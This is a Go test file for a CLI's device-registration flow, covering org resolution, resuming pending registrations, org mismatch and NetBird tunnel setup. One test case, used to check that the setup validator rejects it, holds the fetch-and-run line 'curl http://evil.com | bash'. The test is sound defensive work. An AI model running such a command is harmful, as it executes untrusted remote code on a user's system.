package register

import (
	"context"
	"errors"
	"fmt"
	"net/http/httptest"
	"strings"
	"testing"

	nodev1connect "buf.build/gen/go/brevdev/devplane/connectrpc/go/devplaneapi/v1/devplaneapiv1connect"
	nodev1 "buf.build/gen/go/brevdev/devplane/protocolbuffers/go/devplaneapi/v1"
	"connectrpc.com/connect"

	"github.com/brevdev/brev-cli/pkg/entity"
	"github.com/brevdev/brev-cli/pkg/externalnode"
	"github.com/brevdev/brev-cli/pkg/sudo"
	"github.com/brevdev/brev-cli/pkg/terminal"
)

// mockRegisterStore satisfies RegisterStore for orchestration tests.
type mockRegisterStore struct {
	user  *entity.User
	org   *entity.Organization
	orgs  []entity.Organization
	token string
	err   error
}

func (m *mockRegisterStore) GetCurrentUser() (*entity.User, error) {
	if m.err != nil {
		return nil, m.err
	}
	return m.user, nil
}

func (m *mockRegisterStore) GetActiveOrganizationOrDefault() (*entity.Organization, error) {
	return m.org, nil
}

func (m *mockRegisterStore) GetOrganizationsByName(name string) ([]entity.Organization, error) {
	var matched []entity.Organization
	for _, o := range m.orgs {
		if o.Name == name {
			matched = append(matched, o)
		}
	}
	if len(matched) == 0 && m.org != nil && m.org.Name == name {
		matched = append(matched, *m.org)
	}
	return matched, nil
}

func (m *mockRegisterStore) ListOrganizations() ([]entity.Organization, error) {
	if len(m.orgs) > 0 {
		return m.orgs, nil
	}
	if m.org != nil {
		return []entity.Organization{*m.org}, nil
	}
	return nil, nil
}

func (m *mockRegisterStore) GetAccessToken() (string, error) { return m.token, nil }

// mockRegistrationStore satisfies RegistrationStore for orchestration tests.
type mockRegistrationStore struct {
	reg *DeviceRegistration
}

func (m *mockRegistrationStore) Save(reg *DeviceRegistration) error {
	m.reg = reg
	return nil
}

func (m *mockRegistrationStore) Load(bool) (*DeviceRegistration, error) {
	if m.reg == nil {
		return nil, fmt.Errorf("no registration")
	}
	return m.reg, nil
}

func (m *mockRegistrationStore) Delete() error {
	m.reg = nil
	return nil
}

func (m *mockRegistrationStore) Exists() (bool, error) {
	return m.reg != nil, nil
}

// mock types for registerDeps interfaces

type mockPlatform struct{ compatible bool }

func (m mockPlatform) IsCompatible() bool { return m.compatible }

type mockConfirmer struct{ confirm bool }

func (m mockConfirmer) ConfirmYesNo(_ string) bool { return m.confirm }

// mockSelector implements terminal.Selector by returning the first item (for tests that need org selection).
type mockSelector struct{ choice string }

func (m mockSelector) Select(_ string, items []string) string {
	if m.choice != "" {
		for _, s := range items {
			if s == m.choice {
				return s
			}
		}
	}
	if len(items) > 0 {
		return items[0]
	}
	return ""
}

type mockNetBirdManager struct{ err error }

func (m mockNetBirdManager) Install() error       { return m.err }
func (m mockNetBirdManager) Uninstall() error     { return m.err }
func (m mockNetBirdManager) EnsureRunning() error { return m.err }

type mockSetupRunner struct {
	called bool
	cmd    string
	err    error
}

func (m *mockSetupRunner) RunSetup(script string) error {
	m.called = true
	m.cmd = script
	return m.err
}

type mockNodeClientFactory struct {
	serverURL string
}

func (m mockNodeClientFactory) NewNodeClient(provider externalnode.TokenProvider, _ string) nodev1connect.ExternalNodeServiceClient {
	return NewNodeServiceClient(provider, m.serverURL)
}

// testHardwareProfile returns a realistic HardwareProfile for use in tests.
func testHardwareProfile() *HardwareProfile {
	cpuCount := int32(2)
	ramBytes := int64(131886028) * 1024
	memBytes := int64(131072) * 1024 * 1024
	return &HardwareProfile{
		Architecture: "arm64",
		OS:           "Ubuntu",
		OSVersion:    "24.04",
		GPUs: []GPU{
			{Model: "NVIDIA GB10", Count: 1, MemoryBytes: &memBytes},
		},
		CPUCount: &cpuCount,
		RAMBytes: &ramBytes,
		Storage: []StorageDevice{
			{Name: "nvme0n1", StorageBytes: 500107862016, StorageType: "SSD"},
		},
	}
}

// testRegisterDeps returns deps with all side effects stubbed out, and a fake
// ConnectRPC server backed by the provided fakeNodeService.
func testRegisterDeps(t *testing.T, svc *fakeNodeService, regStore RegistrationStore) (registerDeps, *httptest.Server) {
	t.Helper()

	_, handler := nodev1connect.NewExternalNodeServiceHandler(svc)
	server := httptest.NewServer(handler)

	return registerDeps{
		platform:    mockPlatform{compatible: true},
		prompter:    mockConfirmer{confirm: true},
		selector:    mockSelector{},
		gater:       sudo.CachedGater{},
		netbird:     mockNetBirdManager{},
		setupRunner: &mockSetupRunner{},
		nodeClients: mockNodeClientFactory{serverURL: server.URL},
		hardwareProfiler: &mockHardwareProfiler{
			profile: testHardwareProfile(),
		},
		registrationStore: regStore,
	}, server
}

// testRegisterStore returns the default mock store used by most register tests:
// a logged-in user, a single resolvable org (org_123/TestOrg), and a token.
// Tests that need different orgs can override .org / .orgs after calling this.
func testRegisterStore() *mockRegisterStore {
	return &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}
}

// testPendingReg returns a pending DeviceRegistration for the given org/deviceID,
// the state left when a previous attempt didn't finish.
func testPendingReg(orgID, orgName, deviceID string) *DeviceRegistration {
	return &DeviceRegistration{
		DisplayName: "My Spark",
		OrgID:       orgID,
		OrgName:     orgName,
		DeviceID:    deviceID,
		Status:      RegistrationStatusPending,
	}
}

func Test_runRegister_HappyPath(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := testRegisterStore()

	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			if req.GetOrganizationId() != "org_123" {
				t.Errorf("unexpected org: %s", req.GetOrganizationId())
			}
			if req.GetName() != "my-spark" {
				t.Errorf("unexpected name: %s", req.GetName())
			}
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: "org_123",
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
					ConnectivityInfo: &nodev1.ConnectivityInfo{
						RegistrationCommand: "netbird up --key abc",
					},
				},
			}, nil
		},
	}

	setupRunner := &mockSetupRunner{}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.setupRunner = setupRunner

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg"}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err != nil {
		t.Fatalf("runRegister failed: %v", err)
	}

	// Verify registration was persisted
	exists, err := regStore.Exists()
	if err != nil {
		t.Fatalf("Exists error: %v", err)
	}
	if !exists {
		t.Fatal("expected registration to exist after successful register")
	}

	reg, err := regStore.Load(false)
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}
	if reg.ExternalNodeID != "unode_abc" {
		t.Errorf("expected ExternalNodeID unode_abc, got %s", reg.ExternalNodeID)
	}
	if reg.DisplayName != "my-spark" {
		t.Errorf("expected display name 'my-spark', got %s", reg.DisplayName)
	}
	if reg.OrgID != "org_123" {
		t.Errorf("expected org org_123, got %s", reg.OrgID)
	}

	// Verify setup command was executed
	if setupRunner.cmd != "netbird up --key abc" {
		t.Errorf("expected setup command 'netbird up --key abc', got %q", setupRunner.cmd)
	}
}

// gaterFromFunc adapts a function to sudo.Gater; used only by Test_runRegister_UserCancels.
type gaterFromFunc func(*terminal.Terminal, terminal.Confirmer, string, bool) error

func (f gaterFromFunc) Gate(t *terminal.Terminal, c terminal.Confirmer, reason string, assumeYes bool) error {
	return f(t, c, reason, assumeYes)
}

func Test_runRegister_UserCancels(t *testing.T) {
	// User cancel happens in interactive mode (sudo or confirm). Flag-driven has no prompts.
	regStore := &mockRegistrationStore{}
	store := testRegisterStore()
	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.prompter = mockConfirmer{confirm: false}
	// Use a gater that actually runs the confirmer so the test cancels at the gate
	// instead of proceeding to the device name prompt (CachedGater always passes).
	deps.gater = gaterFromFunc(func(_ *terminal.Terminal, c terminal.Confirmer, reason string, assumeYes bool) error {
		if assumeYes {
			return nil
		}
		if !c.ConfirmYesNo(fmt.Sprintf("%s requires sudo. Continue?", reason)) {
			return fmt.Errorf("%s canceled by user", reason)
		}
		return nil
	})

	term := terminal.New()
	opts := registerOpts{interactive: true, name: "", orgName: ""}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when user declines sudo gate")
	}
	if !strings.Contains(err.Error(), "canceled by user") {
		t.Errorf("expected 'canceled by user' error, got: %v", err)
	}

	exists, _ := regStore.Exists()
	if exists {
		t.Error("registration should not exist after cancel")
	}
}

func Test_runRegister_AlreadyRegistered(t *testing.T) {
	tests := []struct {
		name      string
		getNodeFn func(*nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error)
	}{
		{
			name: "Connected",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
						ConnectivityInfo: &nodev1.ConnectivityInfo{
							Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_CONNECTED,
						},
					},
				}, nil
			},
		},
		{
			name: "Disconnected",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
						ConnectivityInfo: &nodev1.ConnectivityInfo{
							Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_DISCONNECTED,
						},
					},
				}, nil
			},
		},
		{
			name: "GetNodeFails",
			getNodeFn: func(_ *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return nil, connect.NewError(connect.CodeInternal, nil)
			},
		},
		{
			name: "NilConnectivityInfo",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
					},
				}, nil
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			regStore := &mockRegistrationStore{
				reg: &DeviceRegistration{
					ExternalNodeID: "unode_existing",
					DisplayName:    "Existing",
					OrgID:          "org_123",
				},
			}

			store := testRegisterStore()

			svc := &fakeNodeService{getNodeFn: tt.getNodeFn}
			deps, server := testRegisterDeps(t, svc, regStore)
			defer server.Close()

			term := terminal.New()
			// Pass the same name as the existing registration so we go through
			// the checkExistingRegistration path (not the different-name path).
			opts := registerOpts{interactive: false, name: "Existing", orgName: "TestOrg"}
			err := runRegister(context.Background(), term, store, opts, deps)
			if err != nil {
				t.Fatalf("expected nil error, got: %v", err)
			}

			exists, _ := regStore.Exists()
			if !exists {
				t.Error("expected registration to still exist")
			}
		})
	}
}

func Test_runRegister_WithOrgFlag(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_default", Name: "DefaultOrg"},
		orgs: []entity.Organization{
			{ID: "org_456", Name: "SpecificOrg"},
		},
		token: "tok",
	}

	var capturedOrgID string
	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			capturedOrgID = req.GetOrganizationId()
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: req.GetOrganizationId(),
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
				},
			}, nil
		},
	}

	setupRunner := &mockSetupRunner{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()
	deps.setupRunner = setupRunner

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "my-spark", orgName: "SpecificOrg"}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err != nil {
		t.Fatalf("runRegister with --org failed: %v", err)
	}

	if capturedOrgID != "org_456" {
		t.Errorf("expected org_456, got %s", capturedOrgID)
	}

	reg, err := regStore.Load(false)
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}
	if reg.OrgID != "org_456" {
		t.Errorf("expected registration org org_456, got %s", reg.OrgID)
	}
}

func Test_runRegister_WithOrgFlag_NotFound(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_default", Name: "DefaultOrg"},
		orgs:  []entity.Organization{},
		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "my-spark", orgName: "NonexistentOrg"}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when org not found")
	}
	if !strings.Contains(err.Error(), "no organization found") {
		t.Errorf("expected 'no organization found' error, got: %v", err)
	}
}

func Test_runRegister_AddNodeFailure(t *testing.T) {
	tests := []struct {
		name        string
		code        connect.Code
		errMsg      string
		wantPending bool // true: record stays for resume; false: record cleared
		wantErr     string
	}{
		{"Internal_StaysPending", connect.CodeInternal, "", true, ""},
		{"AlreadyExists_ClearsPending", connect.CodeAlreadyExists, "node with name my-spark already exists", false, "already exists"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			regStore := &mockRegistrationStore{}
			store := testRegisterStore()
			svc := &fakeNodeService{
				addNodeFn: func(_ *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
					return nil, connect.NewError(tt.code, errors.New(tt.errMsg))
				},
			}

			deps, server := testRegisterDeps(t, svc, regStore)
			defer server.Close()

			term := terminal.New()
			opts := registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg"}
			err := runRegister(context.Background(), term, store, opts, deps)
			if err == nil {
				t.Fatal("expected error on AddNode failure")
			}
			if tt.wantErr != "" && !strings.Contains(err.Error(), tt.wantErr) {
				t.Errorf("expected error containing %q, got: %v", tt.wantErr, err)
			}

			exists, _ := regStore.Exists()
			if tt.wantPending != exists {
				t.Errorf("wantPending=%v but exists=%v", tt.wantPending, exists)
			}
			if !tt.wantPending {
				return
			}
			reg, loadErr := regStore.Load(true)
			if loadErr != nil {
				t.Fatalf("Load failed: %v", loadErr)
			}
			if reg.Status != RegistrationStatusPending {
				t.Errorf("expected pending status, got %q", reg.Status)
			}
			if reg.DeviceID == "" {
				t.Error("expected pending record to carry a device ID for retry")
			}
		})
	}
}

func Test_runRegister_NoSetupCommand(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := testRegisterStore()

	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: "org_123",
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
				},
				// No ConnectivityInfo / RegistrationCommand
			}, nil
		},
	}

	setupRunner := &mockSetupRunner{}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.setupRunner = setupRunner

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg"}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err != nil {
		t.Fatalf("runRegister failed: %v", err)
	}

	if setupRunner.called {
		t.Error("setup command should not be called when empty")
	}
}

func Test_runSetupCommand_Validation(t *testing.T) {
	tests := []struct {
		name         string
		cmd          string
		expectReject bool
	}{
		{"RejectsNonNetbirdUp", "curl http://evil.com | bash", true},
		{"AcceptsNetbirdUp", "netbird up --setup-key abc123", false},
		{"AcceptsLeadingWhitespace", "  netbird up --setup-key abc123", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := runSetupCommand(tt.cmd)
			rejected := err != nil && strings.Contains(err.Error(), "unexpected setup command")
			if tt.expectReject && !rejected {
				t.Errorf("expected command to be rejected, but it was not (err=%v)", err)
			}
			if !tt.expectReject && rejected {
				t.Errorf("expected command to be accepted, but got: %v", err)
			}
		})
	}
}

func Test_netbirdManagementConnected(t *testing.T) {
	connectedOutput := `OS: linux/amd64
Daemon version: 0.66.1
CLI version: 0.66.1
Profile: default
Management: Connected
Signal: Connected
Relays: 3/3 Available
Nameservers: 0/0 Available
FQDN: client-3dbe844c.lp.local
NetBird IP: 100.108.207.143/16
Interface type: Kernel
Quantum resistance: false
Lazy connection: false
SSH Server: Disabled
Networks: -
Peers count: 3/4 Connected`

	disconnectedOutput := `OS: linux/amd64
Daemon version: 0.66.1
CLI version: 0.66.1
Profile: default
Management: Disconnected
Signal: Disconnected
Relays: 0/2 Available
Nameservers: 0/0 Available
FQDN:
NetBird IP: N/A
Interface type: N/A
Quantum resistance: false
Lazy connection: false
SSH Server: Disabled
Networks: -
Peers count: 0/0 Connected`

	tests := []struct {
		name  string
		input string
		want  bool
	}{
		{"Connected", connectedOutput, true},
		{"Disconnected", disconnectedOutput, false},
		{"EmptyString", "", false},
		{"NoManagementLine", "OS: linux/amd64\nFQDN: test\n", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := netbirdManagementConnected(tt.input)
			if got != tt.want {
				t.Errorf("netbirdManagementConnected() = %v, want %v", got, tt.want)
			}
		})
	}
}

func Test_runRegister_StepFailure(t *testing.T) {
	tests := []struct {
		name      string
		mutate    func(*registerDeps)
		errSubstr string
	}{
		{"PlatformIncompatible", func(d *registerDeps) { d.platform = mockPlatform{compatible: false} }, "only supported on Linux"},
		{"HardwareProfilerFailure", func(d *registerDeps) { d.hardwareProfiler = &mockHardwareProfiler{err: fmt.Errorf("nvml init failed")} }, "hardware profile"},
		{"NetBirdInstallFailure", func(d *registerDeps) { d.netbird = mockNetBirdManager{err: fmt.Errorf("install failed")} }, "tunnel setup failed"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			deps, server := testRegisterDeps(t, &fakeNodeService{}, &mockRegistrationStore{})
			defer server.Close()
			tt.mutate(&deps)

			opts := registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg"}
			err := runRegister(context.Background(), terminal.New(), testRegisterStore(), opts, deps)
			if err == nil {
				t.Fatal("expected error")
			}
			if !strings.Contains(err.Error(), tt.errSubstr) {
				t.Errorf("expected error containing %q, got: %v", tt.errSubstr, err)
			}
		})
	}
}

func Test_runRegister_NoNameNotRegistered(t *testing.T) {
	// In flag-driven mode, missing --name and --org must error (no prompts).
	regStore := &mockRegistrationStore{}

	store := testRegisterStore()

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "", orgName: ""}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when no name/org in non-interactive mode")
	}
	if !strings.Contains(err.Error(), "non-interactive") || !strings.Contains(err.Error(), "--name") {
		t.Errorf("expected non-interactive/--name error, got: %v", err)
	}
}

func Test_runRegister_ResumesPendingRegistration(t *testing.T) {
	const pendingDeviceID = "device-uuid-pending"
	pending := &DeviceRegistration{
		DisplayName:       "My Spark",
		OrgID:             "org_123",
		OrgName:           "TestOrg",
		DeviceID:          pendingDeviceID,
		RegistrationToken: "ui-token-pending",
		Status:            RegistrationStatusPending,
	}
	regStore := &mockRegistrationStore{reg: pending}

	store := testRegisterStore()

	var addNodeDeviceIDs []string
	var addNodeCalls int
	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			addNodeCalls++
			addNodeDeviceIDs = append(addNodeDeviceIDs, req.GetDeviceId())
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: req.GetOrganizationId(),
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
					ConnectivityInfo: &nodev1.ConnectivityInfo{
						RegistrationCommand: "netbird up --key abc",
					},
				},
			}, nil
		},
	}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	// Use interactive mode so non-interactive --name/--org validation doesn't run
	// before the Exists check; on resume the pending record's values are used.
	err := runRegister(context.Background(), term, store, registerOpts{interactive: true}, deps)
	if err != nil {
		t.Fatalf("runRegister failed: %v", err)
	}

	if addNodeCalls != 1 {
		t.Fatalf("expected AddNode to be called once, got %d", addNodeCalls)
	}
	if len(addNodeDeviceIDs) != 1 || addNodeDeviceIDs[0] != pendingDeviceID {
		t.Errorf("expected AddNode to reuse device ID %q, got %v", pendingDeviceID, addNodeDeviceIDs)
	}

	reg, loadErr := regStore.Load(true)
	if loadErr != nil {
		t.Fatalf("Load failed: %v", loadErr)
	}
	if reg.Status != RegistrationStatusRegistered {
		t.Errorf("expected status %q after resume, got %q", RegistrationStatusRegistered, reg.Status)
	}
	if reg.ExternalNodeID != "unode_abc" {
		t.Errorf("expected ExternalNodeID unode_abc, got %q", reg.ExternalNodeID)
	}
	if reg.DeviceID != pendingDeviceID {
		t.Errorf("expected device ID to remain %q, got %q", pendingDeviceID, reg.DeviceID)
	}
	if reg.RegistrationToken != "ui-token-pending" {
		t.Errorf("expected registration token to be preserved, got %q", reg.RegistrationToken)
	}
}

func Test_runRegister_PersistsRegistrationToken(t *testing.T) {
	regStore := &mockRegistrationStore{}
	store := testRegisterStore()
	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: req.GetOrganizationId(),
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
				},
			}, nil
		},
	}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg", registrationToken: "ui-token-xyz"}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err != nil {
		t.Fatalf("runRegister failed: %v", err)
	}

	reg, loadErr := regStore.Load(true)
	if loadErr != nil {
		t.Fatalf("Load failed: %v", loadErr)
	}
	if reg.RegistrationToken != "ui-token-xyz" {
		t.Errorf("expected RegistrationToken to be persisted, got %q", reg.RegistrationToken)
	}
	if reg.Status != RegistrationStatusRegistered {
		t.Errorf("expected registered status, got %q", reg.Status)
	}
}

// --- Access key org scoping ---

func Test_runRegister_OrgMismatch(t *testing.T) {
	tests := []struct {
		name        string
		status      string
		useOrgFlag  bool   // pass --org for the new org
		wantWording string // pending -> "incomplete registration"; registered -> "already registered"
	}{
		{"OrgFlag_Pending", RegistrationStatusPending, true, "incomplete registration"},
		{"OrgFlag_AlreadyRegistered", RegistrationStatusRegistered, true, "already registered"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			regStore := &mockRegistrationStore{reg: &DeviceRegistration{
				ExternalNodeID: "unode_existing",
				DisplayName:    "My Spark",
				OrgID:          "org_other",
				OrgName:        "OtherOrg",
				DeviceID:       "dev-pending",
				Status:         tt.status,
			}}
			store := &mockRegisterStore{
				user:  &entity.User{ID: "user_1"},
				orgs:  []entity.Organization{{ID: "org_123", Name: "TestOrg"}}, // new org
				token: "tok",
			}

			var addNodeCalls int
			svc := &fakeNodeService{
				addNodeFn: func(_ *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
					addNodeCalls++
					return nil, fmt.Errorf("AddNode should not be called on org mismatch")
				},
			}

			deps, server := testRegisterDeps(t, svc, regStore)
			defer server.Close()

			term := terminal.New()
			opts := registerOpts{interactive: false, name: "My Spark", orgName: "TestOrg"}
			err := runRegister(context.Background(), term, store, opts, deps)
			if err == nil {
				t.Fatal("expected error on org mismatch")
			}
			if !strings.Contains(err.Error(), "deregister") {
				t.Errorf("expected deregister guidance, got: %v", err)
			}
			if !strings.Contains(err.Error(), tt.wantWording) {
				t.Errorf("expected %q wording, got: %v", tt.wantWording, err)
			}
			if !strings.Contains(err.Error(), "org_other") || !strings.Contains(err.Error(), "org_123") {
				t.Errorf("expected both org IDs in message, got: %v", err)
			}
			if addNodeCalls != 0 {
				t.Errorf("AddNode must not be called on mismatch, got %d", addNodeCalls)
			}
		})
	}
}

func Test_runRegister_ResumeAddNodeFails_StaysPending(t *testing.T) {
	const pendingDeviceID = "device-uuid-pending"
	regStore := &mockRegistrationStore{reg: testPendingReg("org_123", "TestOrg", pendingDeviceID)}

	store := testRegisterStore()

	var addNodeCalls int
	svc := &fakeNodeService{
		addNodeFn: func(_ *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			addNodeCalls++
			return nil, connect.NewError(connect.CodeInternal, nil)
		},
	}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	err := runRegister(context.Background(), term, store, registerOpts{interactive: true}, deps)
	if err == nil {
		t.Fatal("expected error when AddNode fails during resume")
	}
	if addNodeCalls != 1 {
		t.Fatalf("expected AddNode called once, got %d", addNodeCalls)
	}

	reg, loadErr := regStore.Load(true)
	if loadErr != nil {
		t.Fatalf("Load failed: %v", loadErr)
	}
	if reg.Status != RegistrationStatusPending {
		t.Errorf("expected record to stay pending after failed resume, got %q", reg.Status)
	}
	if reg.DeviceID != pendingDeviceID {
		t.Errorf("expected device ID to remain %q, got %q", pendingDeviceID, reg.DeviceID)
	}
	if reg.ExternalNodeID != "" {
		t.Errorf("expected no ExternalNodeID after failed resume, got %q", reg.ExternalNodeID)
	}
}

func Test_runRegister_OrgFlag_PendingOrgMatch_Resumes(t *testing.T) {
	const pendingDeviceID = "device-uuid-pending"
	regStore := &mockRegistrationStore{reg: testPendingReg("org_123", "TestOrg", pendingDeviceID)}
	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		orgs:  []entity.Organization{{ID: "org_123", Name: "TestOrg"}},
		token: "tok",
	}

	var gotDeviceID string
	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			gotDeviceID = req.GetDeviceId()
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: req.GetOrganizationId(),
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
				},
			}, nil
		},
	}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "My Spark", orgName: "TestOrg"}
	if err := runRegister(context.Background(), term, store, opts, deps); err != nil {
		t.Fatalf("runRegister failed: %v", err)
	}
	if gotDeviceID != pendingDeviceID {
		t.Errorf("expected resume to reuse device ID %q, got %q", pendingDeviceID, gotDeviceID)
	}
	reg, loadErr := regStore.Load(true)
	if loadErr != nil {
		t.Fatalf("Load failed: %v", loadErr)
	}
	if reg.Status != RegistrationStatusRegistered {
		t.Errorf("expected registered status after resume, got %q", reg.Status)
	}
}
